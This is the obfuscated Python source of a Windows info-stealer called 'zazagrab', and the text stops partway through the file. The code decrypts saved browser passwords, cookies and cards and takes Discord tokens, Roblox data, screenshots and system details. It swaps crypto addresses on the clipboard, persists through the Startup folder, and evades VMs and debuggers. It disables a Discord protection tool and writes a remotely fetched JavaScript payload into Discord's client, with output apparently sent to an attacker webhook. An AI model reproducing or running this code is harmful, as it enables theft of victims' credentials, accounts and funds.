import asyncio #line:1
import json #line:2
import ntpath #line:3
import os #line:4
import random #line:5
import re #line:6
import shutil #line:7
import sqlite3 #line:8
import subprocess #line:9
import threading #line:10
import winreg #line:11
import zipfile #line:12
import httpx #line:13
import psutil #line:14
import base64 #line:15
import requests #line:16
import ctypes #line:17
import time #line:18
import pyperclip #line:19
import win32gui #line:20
import win32con #line:21
from sqlite3 import connect #line:24
from base64 import b64decode #line:25
from urllib .request import Request ,urlopen #line:26
from shutil import copy2 #line:27
from datetime import datetime ,timedelta ,timezone #line:28
from sys import argv #line:29
from tempfile import gettempdir ,mkdtemp #line:30
from json import loads ,dumps #line:31
from ctypes import windll ,wintypes ,byref ,cdll ,Structure ,POINTER ,c_char ,c_buffer #line:32
from Crypto .Cipher import AES #line:33
from PIL import ImageGrab #line:34
from win32crypt import CryptUnprotectData #line:35
local =os .getenv ('LOCALAPPDATA')#line:38
roaming =os .getenv ('APPDATA')#line:39
temp =os .getenv ("TEMP")#line:40
Passw =[];#line:42
__config__ ={'yourwebhookurl':"%WEBHOOK_HERE%",'zazagrab_inject_url':"https://raw.githubusercontent.com/zazaman4000/zaza-inject/main/index.js",'hide':'%_hide_script%','ping':'%ping_enabled%','pingtype':'%ping_type%','fake_error':'%_error_enabled%','startup':'%_startup_enabled%','kill_discord_process':'%kill_discord_process%','dbugkiller':'%_debugkiller%','addresse_crypto_replacer':'%_address_replacer%','addresse_btc':'%_btc_address%','addresse_eth':'%_eth_address%','addresse_xchain':'%_xchain_address%','addresse_pchain':'%_pchain_address%','addresse_cchain':'%_cchain_address%','addresse_monero':'%_monero_address%','addresse_ada':'%_ada_address%','addresse_dash':'%_dash_address%','blprggg':["httpdebuggerui","wireshark","fiddler","regedit","cmd","taskmgr","vboxservice","df5serv","processhacker","vboxtray","vmtoolsd","vmwaretray","ida64","ollydbg","pestudio","vmwareuser","vgauthservice","vmacthlp","x96dbg","vmsrvc","x32dbg","vmusrvc","prl_cc","prl_tools","xenservice","qemu-ga","joeboxcontrol","ksdumperclient","ksdumper","joeboxserver"]}#line:109
infocom =os .getlogin ()#line:114
vctm_pc =os .getenv ("COMPUTERNAME")#line:115
r4m =str (psutil .virtual_memory ()[0 ]/1024 **3 ).split (".")[0 ]#line:116
d1sk =str (psutil .disk_usage ('/')[0 ]/1024 **3 ).split (".")[0 ]#line:117
Zazagrab_Regex ='https://paste.bingner.com/paste/fhvyp/raw'#line:119
reg_req =requests .get (Zazagrab_Regex )#line:120
clear_reg =r"[\w-]{24}\."+reg_req .text #line:121
class Functions (object ):#line:126
    @staticmethod #line:128
    def gtmk3y (OOO000OOOO0000000 :str or os .PathLike ):#line:129
        if not ntpath .exists (OOO000OOOO0000000 ):#line:130
            return None #line:131
        with open (OOO000OOOO0000000 ,"r",encoding ="utf-8")as OOOOOO00000O0OO0O :#line:132
            OO00OOOO0OO0O0000 =OOOOOO00000O0OO0O .read ()#line:133
        O0O00000OO00000OO =json .loads (OO00OOOO0OO0O0000 )#line:134
        try :#line:136
            OOO00OOO0000000OO =b64decode (O0O00000OO00000OO ["os_crypt"]["encrypted_key"])#line:137
            return Functions .w1nd0_dcr (OOO00OOO0000000OO [5 :])#line:138
        except KeyError :#line:139
            return None #line:140
    @staticmethod #line:142
    def cnverttim (O0O000000O0OOO00O :int or float )->str :#line:143
        try :#line:144
            OO0000O0OOO000O00 =datetime (1601 ,1 ,1 ,tzinfo =timezone .utc )#line:145
            OOOO000OOOO0000O0 =OO0000O0OOO000O00 +timedelta (microseconds =O0O000000O0OOO00O )#line:146
            return OOOO000OOOO0000O0 #line:147
        except Exception :#line:148
            pass #line:149
    @staticmethod #line:151
    def w1nd0_dcr (O0OOO00O0OO0O0OOO :bytes )->str :#line:152
        return CryptUnprotectData (O0OOO00O0OO0O0OOO ,None ,None ,None ,0 )[1 ]#line:153
    @staticmethod #line:155
    def cr34t3_f1lkes (_dir :str or os .PathLike =gettempdir ()):#line:156
        O00OOO0O00OOO0000 =''.join (random .SystemRandom ().choice ('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')for _OOOO00O0OO00O0OO0 in range (random .randint (10 ,20 )))#line:157
        O000O000OOO0OOO00 =ntpath .join (_dir ,O00OOO0O00OOO0000 )#line:158
        open (O000O000OOO0OOO00 ,"x")#line:159
        return O000O000OOO0OOO00 #line:160
    @staticmethod #line:162
    def dcrpt_val (OOO00000OOO0O0OOO ,OO0OO0OOOO00OO000 )->str :#line:163
        try :#line:164
            O000O00OOOOOO0000 =OOO00000OOO0O0OOO [3 :15 ]#line:165
            OOO0OO0OOOO000000 =OOO00000OOO0O0OOO [15 :]#line:166
            O0O00OOO0OO000OO0 =AES .new (OO0OO0OOOO00OO000 ,AES .MODE_GCM ,O000O00OOOOOO0000 )#line:167
            O0O0OO00OOOO0OOO0 =O0O00OOO0OO000OO0 .decrypt (OOO0OO0OOOO000000 )#line:168
            O0O0OO00OOOO0OOO0 =O0O0OO00OOOO0OOO0 [:-16 ].decode ()#line:169
            return O0O0OO00OOOO0OOO0 #line:170
        except Exception :#line:171
            return f'Failed to decrypt "{str(OOO00000OOO0O0OOO)}" | key: "{str(OO0OO0OOOO00OO000)}"'#line:172
    @staticmethod #line:174
    def g3t_H (token :str =None ):#line:175
        OO0000000000O0OOO ={"Content-Type":"application/json",}#line:178
        if token :#line:179
            OO0000000000O0OOO .update ({"Authorization":token })#line:180
        return OO0000000000O0OOO #line:181
    @staticmethod #line:183
    def sys_1fo ()->list :#line:184
        OO0OOO000O0OOOO0O =0x08000000 #line:185
        OOOOO0OO00000O0OO ="wmic csproduct get uuid"#line:186
        OO00O00OOOOOOO0O0 ="powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"#line:187
        OO0O0O0000O0O0OOO ="powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"#line:188
        try :#line:189
            OOO0O000OOO00OO0O =subprocess .check_output (OOOOO0OO00000O0OO ,creationflags =OO0OOO000O0OOOO0O ).decode ().split ('\n')[1 ].strip ()#line:190
        except Exception :#line:191
            OOO0O000OOO00OO0O ="N/A"#line:192
        try :#line:193
            O000O00000OO0O000 =subprocess .check_output (OO00O00OOOOOOO0O0 ,creationflags =OO0OOO000O0OOOO0O ).decode ().rstrip ()#line:194
        except Exception :#line:195
            O000O00000OO0O000 ="N/A"#line:196
        try :#line:197
            OO0OOOOO0O0000OOO =subprocess .check_output (OO0O0O0000O0O0OOO ,creationflags =OO0OOO000O0OOOO0O ).decode ().rstrip ()#line:198
        except Exception :#line:199
            OO0OOOOO0O0000OOO ="N/A"#line:200
        return [OOO0O000OOO00OO0O ,OO0OOOOO0O0000OOO ,O000O00000OO0O000 ]#line:201
    @staticmethod #line:204
    def net_1fo ()->list :#line:205
        O00O00000OO00000O ,OO0OOOOOOO0000000 ,OO0000OOOO0O00O00 ,O0O000O0000O000OO ,OOOO000OOOOO00O00 ,OO0O0O00OOO00O0O0 ,O0O0O00O0OOOO000O ="None","None","None","None","None","None","None"#line:206
        OOO00000000OOO0OO =httpx .get ("https://ipinfo.io/json")#line:207
        if OOO00000000OOO0OO .status_code ==200 :#line:208
            OOO0O00O0OO0O00O0 =OOO00000000OOO0OO .json ()#line:209
            O00O00000OO00000O =OOO0O00O0OO0O00O0 .get ('ip')#line:210
            OO0OOOOOOO0000000 =OOO0O00O0OO0O00O0 .get ('city')#line:211
            OO0000OOOO0O00O00 =OOO0O00O0OO0O00O0 .get ('country')#line:212
            O0O000O0000O000OO =OOO0O00O0OO0O00O0 .get ('region')#line:213
            OOOO000OOOOO00O00 =OOO0O00O0OO0O00O0 .get ('org')#line:214
            OO0O0O00OOO00O0O0 =OOO0O00O0OO0O00O0 .get ('loc')#line:215
            O0O0O00O0OOOO000O ="https://www.google.com/maps/search/google+map++"+OO0O0O00OOO00O0O0 #line:216
        return [O00O00000OO00000O ,OO0OOOOOOO0000000 ,OO0000OOOO0O00O00 ,O0O000O0000O000OO ,OOOO000OOOOO00O00 ,OO0O0O00OOO00O0O0 ,O0O0O00O0OOOO000O ]#line:217
    @staticmethod #line:219
    def fetch_conf (OO000OOOO0OOO000O :str )->str or bool |None :#line:220
        return __config__ .get (OO000OOOO0OOO000O )#line:221
class auto_copy_wallet (Functions ):#line:232
    def __init__ (O000000OOOO000O0O ):#line:233
        O000000OOOO000O0O .address_st3aler =O000000OOOO000O0O .fetch_conf ("addresse_crypto_replacer")#line:234
        O000000OOOO000O0O .address_btc =O000000OOOO000O0O .fetch_conf ("addresse_btc")#line:235
        O000000OOOO000O0O .address_eth =O000000OOOO000O0O .fetch_conf ("addresse_eth")#line:236
        O000000OOOO000O0O .address_xchain =O000000OOOO000O0O .fetch_conf ("addresse_xchain")#line:237
        O000000OOOO000O0O .address_pchain =O000000OOOO000O0O .fetch_conf ("addresse_pchain")#line:238
        O000000OOOO000O0O .address_cchain =O000000OOOO000O0O .fetch_conf ("addresse_cchain")#line:239
        O000000OOOO000O0O .address_monero =O000000OOOO000O0O .fetch_conf ("addresse_monero")#line:240
        O000000OOOO000O0O .address_ada =O000000OOOO000O0O .fetch_conf ("addresse_ada")#line:241
        O000000OOOO000O0O .address_dash =O000000OOOO000O0O .fetch_conf ("addresse_dash")#line:242
    def address_swap (O00O00000O000OOOO ):#line:245
        try :#line:246
            OO0OOO00O00OO00OO =pyperclip .paste ()#line:247
            if re .search ('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$',OO0OOO00O00OO00OO ):#line:248
                if OO0OOO00O00OO00OO not in [O00O00000O000OOOO .address_btc ,O00O00000O000OOOO .address_eth ,O00O00000O000OOOO .address_xchain ,O00O00000O000OOOO .address_pchain ,O00O00000O000OOOO .address_cchain ,O00O00000O000OOOO .address_monero ,O00O00000O000OOOO .address_ada ,O00O00000O000OOOO .address_dash ]:#line:249
                    if O00O00000O000OOOO .address_btc !="none":#line:250
                        pyperclip .copy (O00O00000O000OOOO .address_btc )#line:251
                        pyperclip .paste ()#line:252
            if re .search ('^0x[a-fA-F0-9]{40}$',OO0OOO00O00OO00OO ):#line:254
                pyperclip .copy (O00O00000O000OOOO .address_eth )#line:255
                pyperclip .paste ()#line:256
            if re .search ('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$',OO0OOO00O00OO00OO ):#line:258
                if O00O00000O000OOOO .address_xchain !="none":#line:259
                    if OO0OOO00O00OO00OO not in [O00O00000O000OOOO .address_btc ,O00O00000O000OOOO .address_eth ,O00O00000O000OOOO .address_xchain ,O00O00000O000OOOO .address_pchain ,O00O00000O000OOOO .address_cchain ,O00O00000O000OOOO .address_monero ,O00O00000O000OOOO .address_ada ,O00O00000O000OOOO .address_dash ]:#line:260
                        pyperclip .copy (O00O00000O000OOOO .address_xchain )#line:261
                        pyperclip .paste ()#line:262
            if re .search ('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$',OO0OOO00O00OO00OO ):#line:265
                if O00O00000O000OOOO .address_pchain !="none":#line:266
                    if OO0OOO00O00OO00OO not in [O00O00000O000OOOO .address_btc ,O00O00000O000OOOO .address_eth ,O00O00000O000OOOO .address_xchain ,O00O00000O000OOOO .address_pchain ,O00O00000O000OOOO .address_cchain ,O00O00000O000OOOO .address_monero ,O00O00000O000OOOO .address_ada ,O00O00000O000OOOO .address_dash ]:#line:267
                        pyperclip .copy (O00O00000O000OOOO .address_pchain )#line:268
                        pyperclip .paste ()#line:269
            if re .search ('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$',OO0OOO00O00OO00OO ):#line:272
                if O00O00000O000OOOO .address_cchain !="none":#line:273
                    if OO0OOO00O00OO00OO not in [O00O00000O000OOOO .address_btc ,O00O00000O000OOOO .address_eth ,O00O00000O000OOOO .address_xchain ,O00O00000O000OOOO .address_pchain ,O00O00000O000OOOO .address_cchain ,O00O00000O000OOOO .address_monero ,O00O00000O000OOOO .address_ada ,O00O00000O000OOOO .address_dash ]:#line:274
                        pyperclip .copy (O00O00000O000OOOO .address_cchain )#line:275
                        pyperclip .paste ()#line:276
            if re .search ('addr1[a-z0-9]+',OO0OOO00O00OO00OO ):#line:279
                    if OO0OOO00O00OO00OO not in [O00O00000O000OOOO .address_btc ,O00O00000O000OOOO .address_eth ,O00O00000O000OOOO .address_xchain ,O00O00000O000OOOO .address_pchain ,O00O00000O000OOOO .address_cchain ,O00O00000O000OOOO .address_monero ,O00O00000O000OOOO .address_ada ,O00O00000O000OOOO .address_dash ]:#line:280
                        pyperclip .copy (O00O00000O000OOOO .address_ada )#line:281
                        pyperclip .paste ()#line:282
            if re .search ('/X[1-9A-HJ-NP-Za-km-z]{33}$/g',OO0OOO00O00OO00OO ):#line:284
                if O00O00000O000OOOO .address_dash !="none":#line:285
                    if OO0OOO00O00OO00OO not in [O00O00000O000OOOO .address_btc ,O00O00000O000OOOO .address_eth ,O00O00000O000OOOO .address_xchain ,O00O00000O000OOOO .address_pchain ,O00O00000O000OOOO .address_cchain ,O00O00000O000OOOO .address_monero ,O00O00000O000OOOO .address_ada ,O00O00000O000OOOO .address_dash ]:#line:286
                        pyperclip .copy (O00O00000O000OOOO .address_dash )#line:287
                        pyperclip .paste ()#line:288
            if re .search ('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g',OO0OOO00O00OO00OO ):#line:290
                if O00O00000O000OOOO .address_monero !="none":#line:291
                    if OO0OOO00O00OO00OO not in [O00O00000O000OOOO .address_btc ,O00O00000O000OOOO .address_eth ,O00O00000O000OOOO .address_xchain ,O00O00000O000OOOO .address_pchain ,O00O00000O000OOOO .address_cchain ,O00O00000O000OOOO .address_monero ,O00O00000O000OOOO .address_ada ,O00O00000O000OOOO .address_dash ]:#line:292
                        pyperclip .copy (O00O00000O000OOOO .address_monero )#line:293
                        pyperclip .paste ()#line:294
        except :#line:297
            O00000O0000000OO0 =None #line:298
    def loop_through (O0OO000OO0OOO0OOO ):#line:301
        while True :#line:303
            O0OO000OO0OOO0OOO .address_swap ()#line:304
    def run (O0OOOO000000O0OOO ):#line:306
        if O0OOOO000000O0OOO .address_st3aler =="yes":#line:307
            O0OOOO000000O0OOO .loop_through ()#line:308
class zg_initial_func (Functions ):#line:311
    def __init__ (OOOOOOO0O0O0OO0O0 ):#line:312
        OOOOOOO0O0O0OO0O0 .dscap1 ="https://discord.com/api/v9/users/@me"#line:314
        OOOOOOO0O0O0OO0O0 .discord_webhook =OOOOOOO0O0O0OO0O0 .fetch_conf ('yourwebhookurl')#line:316
        OOOOOOO0O0O0OO0O0 .hide =OOOOOOO0O0O0OO0O0 .fetch_conf ("hide")#line:318
        OOOOOOO0O0O0OO0O0 .pingtype =OOOOOOO0O0O0OO0O0 .fetch_conf ("pingtype")#line:320
        OOOOOOO0O0O0OO0O0 .pingonrun =OOOOOOO0O0O0OO0O0 .fetch_conf ("ping")#line:322
        OOOOOOO0O0O0OO0O0 .baseurl ="https://discord.com/api/v9/users/@me"#line:324
        OOOOOOO0O0O0OO0O0 .startupexe =OOOOOOO0O0O0OO0O0 .fetch_conf ("startup")#line:326
        OOOOOOO0O0O0OO0O0 .fake_error =OOOOOOO0O0O0OO0O0 .fetch_conf ("fake_error")#line:328
        OOOOOOO0O0O0OO0O0 .appdata =os .getenv ("localappdata")#line:330
        OOOOOOO0O0O0OO0O0 .roaming =os .getenv ("appdata")#line:332
        OOOOOOO0O0O0OO0O0 .chrmmuserdtt =ntpath .join (OOOOOOO0O0O0OO0O0 .appdata ,'Google','Chrome','User Data')#line:334
        OOOOOOO0O0O0OO0O0 .dir ,OOOOOOO0O0O0OO0O0 .temp =mkdtemp (),gettempdir ()#line:336
        O0O000OOO0000O0O0 ,OOO00OOO00O0OOO0O =OOOOOOO0O0O0OO0O0 .sys_1fo (),OOOOOOO0O0O0OO0O0 .net_1fo ()#line:338
        OOOOOOO0O0O0OO0O0 .uuidwndz ,OOOOOOO0O0O0OO0O0 .w1nv3r ,OOOOOOO0O0O0OO0O0 .w1nk33y =O0O000OOO0000O0O0 [0 ],O0O000OOO0000O0O0 [1 ],O0O000OOO0000O0O0 [2 ]#line:340
        OOOOOOO0O0O0OO0O0 .ip ,OOOOOOO0O0O0OO0O0 .city ,OOOOOOO0O0O0OO0O0 .country ,OOOOOOO0O0O0OO0O0 .region ,OOOOOOO0O0O0OO0O0 .org ,OOOOOOO0O0O0OO0O0 .loc ,OOOOOOO0O0O0OO0O0 .googlemap =OOO00OOO00O0OOO0O [0 ],OOO00OOO00O0OOO0O [1 ],OOO00OOO00O0OOO0O [2 ],OOO00OOO00O0OOO0O [3 ],OOO00OOO00O0OOO0O [4 ],OOO00OOO00O0OOO0O [5 ],OOO00OOO00O0OOO0O [6 ]#line:342
        OOOOOOO0O0O0OO0O0 .srtupl0c =ntpath .join (OOOOOOO0O0O0OO0O0 .roaming ,'Microsoft','Windows','Start Menu','Programs','Startup')#line:344
        OOOOOOO0O0O0OO0O0 .regex_webhook_dsc ="api/webhooks"#line:346
        OOOOOOO0O0O0OO0O0 .chrmrgx =re .compile (r'(^profile\s\d*)|default|(guest profile$)',re .IGNORECASE |re .MULTILINE );#line:348
        OOOOOOO0O0O0OO0O0 .baseurl ="https://discord.com/api/v9/users/@me"#line:350
        OOOOOOO0O0O0OO0O0 .regex =clear_reg #line:352
        OOOOOOO0O0O0OO0O0 .encrypted_regex =r"dQw4w9WgXcQ:[^\"]*"#line:354
        OOOOOOO0O0O0OO0O0 .tokens =[]#line:356
        OOOOOOO0O0O0OO0O0 .zg_id =[]#line:358
        OOOOOOO0O0O0OO0O0 .sep =os .sep ;#line:360
        OOOOOOO0O0O0OO0O0 .robloxcookies =[];#line:362
        OOOOOOO0O0O0OO0O0 .chrome_key =OOOOOOO0O0O0OO0O0 .gtmk3y (ntpath .join (OOOOOOO0O0O0OO0O0 .chrmmuserdtt ,"Local State"));#line:364
        os .makedirs (OOOOOOO0O0O0OO0O0 .dir ,exist_ok =True );#line:367
    def error_remote (OO0O0OOOOOO0OOOO0 :str )->str :#line:373
        if OO0O0OOOOOO0OOOO0 .fake_error =="yes":#line:374
            ctypes .windll .user32 .MessageBoxW (None ,'Error code: Windows_0x988958\nSomething gone wrong.','Fatal Error',0 )#line:375
    def ping_on_running (O00OO0OOO0OO0O0O0 :str )->str :#line:377
        O0OOO0OOO0OOOO00O ={'avatar_url':'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/zazagrab(2).jpg','content':"@everyone"}#line:381
        OOOOO000OOOO00000 ={'avatar_url':'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/zazagrab(2).jpg','content':"@here"}#line:385
        if O00OO0OOO0OO0O0O0 .pingonrun =="yes":#line:386
            if O00OO0OOO0OO0O0O0 .regex_webhook_dsc in O00OO0OOO0OO0O0O0 .discord_webhook :#line:387
                if O00OO0OOO0OO0O0O0 .pingtype =="@everyone"or O00OO0OOO0OO0O0O0 .pingtype =="everyone":#line:388
                    httpx .post (O00OO0OOO0OO0O0O0 .discord_webhook ,json =O0OOO0OOO0OOOO00O )#line:389
            if O00OO0OOO0OO0O0O0 .pingtype =="@here"or O00OO0OOO0OO0O0O0 .pingtype =="here":#line:390
                if O00OO0OOO0OO0O0O0 .regex_webhook_dsc in O00OO0OOO0OO0O0O0 .discord_webhook :#line:391
                    httpx .post (O00OO0OOO0OO0O0O0 .discord_webhook ,json =OOOOO000OOOO00000 )#line:392
    def startupzazagrab (O0O0O00O0OOOO00OO :str )->str :#line:396
        if O0O0O00O0OOOO00OO .startupexe =="yes":#line:397
            O00OOOO0O0OOOO000 =os .getenv ("appdata")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"#line:398
            if os .path .exists (O00OOOO0O0OOOO000 +argv [0 ]):#line:399
                os .remove (O00OOOO0O0OOOO000 +argv [0 ])#line:400
                copy2 (argv [0 ],O00OOOO0O0OOOO000 )#line:401
            else :#line:402
                copy2 (argv [0 ],O00OOOO0O0OOOO000 )#line:403
    def hidethis (O0OO0000O0OOOOOO0 :str )->str :#line:407
        if O0OO0000O0OOOOOO0 .hide =="yes":#line:408
            OO0OO0O0OOO000O0O =win32gui .GetForegroundWindow ()#line:409
            win32gui .ShowWindow (OO0OO0O0OOO000O0O ,win32con .SW_HIDE )#line:410
    def zg_exit_this (O0OO0O0O00000O0O0 ):#line:415
        shutil .rmtree (O0OO0O0O00000O0O0 .dir ,ignore_errors =True )#line:416
        os ._exit (0 )#line:417
    def extract_try (O0O0O000O0OO00O00 ):#line:419
        ""#line:420
        def O00OO00O000O00000 (*OO00000O0OOO0OO0O ,**OO0O0O0O0OO00O0O0 ):#line:421
            try :#line:422
                O0O0O000O0OO00O00 (*OO00000O0OOO0OO0O ,**OO0O0O0O0OO00O0O0 )#line:423
            except Exception :#line:424
                pass #line:425
        return O00OO00O000O00000 #line:426
    async def init (OO0O000O0000OOO00 ):#line:428
        OO0O000O0000OOO00 .browsers ={'amigo':OO0O000O0000OOO00 .appdata +'\\Amigo\\User Data','torch':OO0O000O0000OOO00 .appdata +'\\Torch\\User Data','kometa':OO0O000O0000OOO00 .appdata +'\\Kometa\\User Data','orbitum':OO0O000O0000OOO00 .appdata +'\\Orbitum\\User Data','cent-browser':OO0O000O0000OOO00 .appdata +'\\CentBrowser\\User Data','7star':OO0O000O0000OOO00 .appdata +'\\7Star\\7Star\\User Data','sputnik':OO0O000O0000OOO00 .appdata +'\\Sputnik\\Sputnik\\User Data','vivaldi':OO0O000O0000OOO00 .appdata +'\\Vivaldi\\User Data','google-chrome-sxs':OO0O000O0000OOO00 .appdata +'\\Google\\Chrome SxS\\User Data','google-chrome':OO0O000O0000OOO00 .appdata +'\\Google\\Chrome\\User Data','epic-privacy-browser':OO0O000O0000OOO00 .appdata +'\\Epic Privacy Browser\\User Data','microsoft-edge':OO0O000O0000OOO00 .appdata +'\\Microsoft\\Edge\\User Data','uran':OO0O000O0000OOO00 .appdata +'\\uCozMedia\\Uran\\User Data','yandex':OO0O000O0000OOO00 .appdata +'\\Yandex\\YandexBrowser\\User Data','brave':OO0O000O0000OOO00 .appdata +'\\BraveSoftware\\Brave-Browser\\User Data','iridium':OO0O000O0000OOO00 .appdata +'\\Iridium\\User Data','edge':OO0O000O0000OOO00 .appdata +"\\Microsoft\\Edge\\User Data"}#line:448
        OO0O000O0000OOO00 .profiles =['Default','Profile 1','Profile 2','Profile 3','Profile 4','Profile 5',]#line:456
        if OO0O000O0000OOO00 .discord_webhook ==""or OO0O000O0000OOO00 .discord_webhook =="\x57EBHOOK_HERE":#line:458
            OO0O000O0000OOO00 .zg_exit_this ()#line:459
        OO0O000O0000OOO00 .hidethis ()#line:461
        OO0O000O0000OOO00 .error_remote ()#line:462
        OO0O000O0000OOO00 .startupzazagrab ()#line:463
        if OO0O000O0000OOO00 .fetch_conf ('dbugkiller')and NoDebugg ().inVM is True :#line:465
            OO0O000O0000OOO00 .zg_exit_this ()#line:466
        await OO0O000O0000OOO00 .bypass_bttdsc ()#line:467
        await OO0O000O0000OOO00 .bypass_tokenprtct ()#line:468
        O000OO0O0OO000OOO =[OO0O000O0000OOO00 .steal_screen ,OO0O000O0000OOO00 .system_informations ,OO0O000O0000OOO00 .steal_token ,OO0O000O0000OOO00 .grabb_mc ,OO0O000O0000OOO00 .grabb_roblox ]#line:470
        if OO0O000O0000OOO00 .fetch_conf ('kill_discord_process'):#line:473
            await OO0O000O0000OOO00 .kill_process_id ()#line:475
        os .makedirs (ntpath .join (OO0O000O0000OOO00 .dir ,'Browsers'),exist_ok =True )#line:479
        for O000O0OO0OO0O00OO ,OOOOOO00O000OO0O0 in OO0O000O0000OOO00 .browsers .items ():#line:480
            if not os .path .isdir (OOOOOO00O000OO0O0 ):#line:481
                continue #line:482
            OO0O000O0000OOO00 .masterkey =OO0O000O0000OOO00 .gtmk3y (OOOOOO00O000OO0O0 +'\\Local State')#line:484
            OO0O000O0000OOO00 .funcs =[OO0O000O0000OOO00 .steal_cookies2 ,OO0O000O0000OOO00 .steal_history2 ,OO0O000O0000OOO00 .steal_passwords2 ,OO0O000O0000OOO00 .steal_cc2 ]#line:490
            for O00000O0OOO0O0OO0 in OO0O000O0000OOO00 .profiles :#line:492
                for O0O0O0000OO00OO0O in OO0O000O0000OOO00 .funcs :#line:493
                    try :#line:494
                        O0O0O0000OO00OO0O (O000O0OO0OO0O00OO ,OOOOOO00O000OO0O0 ,O00000O0OOO0O0OO0 )#line:495
                    except :#line:496
                        pass #line:497
        if ntpath .exists (OO0O000O0000OOO00 .chrmmuserdtt )and OO0O000O0000OOO00 .chrome_key is not None :#line:499
            os .makedirs (ntpath .join (OO0O000O0000OOO00 .dir ,'Google'),exist_ok =True )#line:500
            O000OO0O0OO000OOO .extend ([OO0O000O0000OOO00 .steal_passwords ,OO0O000O0000OOO00 .steal_cookies ,OO0O000O0000OOO00 .steal_history ])#line:501
        for O0O0O0000OO00OO0O in O000OO0O0OO000OOO :#line:503
            O0O00O00OO00O00O0 =threading .Thread (target =O0O0O0000OO00OO0O ,daemon =True )#line:504
            O0O00O00OO00O00O0 .start ()#line:505
        for O0O0O000OOO0O00O0 in threading .enumerate ():#line:506
            try :#line:507
                O0O0O000OOO0O00O0 .join ()#line:508
            except RuntimeError :#line:509
                continue #line:510
        OO0O000O0000OOO00 .natify_matched_tokens ()#line:511
        await OO0O000O0000OOO00 ._inject_disc ()#line:512
        OO0O000O0000OOO00 .ping_on_running ()#line:513
        OO0O000O0000OOO00 .finished_zg ()#line:514
    async def _inject_disc (O0O0O0O000OOO0OO0 ):#line:518
        for _O00OOOOOOO000OOOO in os .listdir (O0O0O0O000OOO0OO0 .appdata ):#line:520
            if 'discord'in _O00OOOOOOO000OOOO .lower ():#line:522
                OOOO000OOO0000O0O =O0O0O0O000OOO0OO0 .appdata +os .sep +_O00OOOOOOO000OOOO #line:523
                for __O0OO00O0O000O00OO in os .listdir (ntpath .abspath (OOOO000OOO0000O0O )):#line:524
                    if re .match (r'app-(\d*\.\d*)*',__O0OO00O0O000O00OO ):#line:526
                        O0OOO00O00O0OO0OO =ntpath .abspath (ntpath .join (OOOO000OOO0000O0O ,__O0OO00O0O000O00OO ))#line:527
                        OOOO0OO00O00O0OO0 =ntpath .join (O0OOO00O00O0OO0OO ,'modules')#line:528
                        if not ntpath .exists (OOOO0OO00O00O0OO0 ):#line:531
                            return #line:532
                        for __O0OO00OOOO0O00000 in os .listdir (OOOO0OO00O00O0OO0 ):#line:535
                            if re .match (r"discord_desktop_core-\d+",__O0OO00OOOO0O00000 ):#line:537
                                O0000OOOOOO00OOO0 =OOOO0OO00O00O0OO0 +os .sep +__O0OO00OOOO0O00000 +f'\\discord_desktop_core\\'#line:538
                                if ntpath .exists (O0000OOOOOO00OOO0 ):#line:540
                                    if O0O0O0O000OOO0OO0 .srtupl0c not in argv [0 ]:#line:542
                                        try :#line:543
                                            os .makedirs (O0000OOOOOO00OOO0 +'zazagrab',exist_ok =True )#line:544
                                        except PermissionError :#line:545
                                            pass #line:546
                                    if O0O0O0O000OOO0OO0 .regex_webhook_dsc in O0O0O0O000OOO0OO0 .discord_webhook :#line:548
                                        O0O0OOOO00O00OOOO =httpx .get (O0O0O0O000OOO0OO0 .fetch_conf ('zazagrab_inject_url')).text .replace ("%WEBHOOK%",O0O0O0O000OOO0OO0 .discord_webhook )#line:550
                                    try :#line:552
                                        with open (O0000OOOOOO00OOO0 +'index.js','w',errors ="ignore")as O000O0O0OO0OO00OO :#line:553
                                            O000O0O0OO0OO00OO .write (O0O0OOOO00O00OOOO )#line:554
                                    except PermissionError :#line:555
                                        pass #line:556
                                    if O0O0O0O000OOO0OO0 .fetch_conf ('kill_discord_process'):#line:558
                                        os .startfile (O0OOO00O00O0OO0OO +O0O0O0O000OOO0OO0 .sep +_O00OOOOOOO000OOOO +'.exe')#line:559
    async def bypass_tokenprtct (OOOOO000O000OOOO0 ):#line:561
        O000OOOO00O0OOOOO =f"{OOOOO000O000OOOO0.roaming}\\DiscordTokenProtector\\"#line:562
        if not ntpath .exists (O000OOOO00O0OOOOO ):#line:563
            return #line:564
        OO0O0OOO000OO0000 =O000OOOO00O0OOOOO +"config.json"#line:565
        for O00OO000000OOO00O in ["DiscordTokenProtector.exe","ProtectionPayload.dll","secure.dat"]:#line:567
            try :#line:568
                os .remove (O000OOOO00O0OOOOO +O00OO000000OOO00O )#line:569
            except FileNotFoundError :#line:570
                pass #line:571
        if ntpath .exists (OO0O0OOO000OO0000 ):#line:572
            with open (OO0O0OOO000OO0000 ,errors ="ignore")as O0000OOOO000OO0O0 :#line:573
                try :#line:574
                    O00O0O0OOOOOOO00O =json .load (O0000OOOO000OO0O0 )#line:575
                except json .decoder .JSONDecodeError :#line:576
                    return #line:577
                O00O0O0OOOOOOO00O ['ksch_is_here']="https://github.com/zazaman4000"#line:578
                O00O0O0OOOOOOO00O ['auto_start']=False #line:579
                O00O0O0OOOOOOO00O ['auto_start_discord']=False #line:580
                O00O0O0OOOOOOO00O ['integrity']=False #line:581
                O00O0O0OOOOOOO00O ['integrity_allowbetterdiscord']=False #line:582
                O00O0O0OOOOOOO00O ['integrity_checkexecutable']=False #line:583
                O00O0O0OOOOOOO00O ['integrity_checkhash']=False #line:584
                O00O0O0OOOOOOO00O ['integrity_checkmodule']=False #line:585
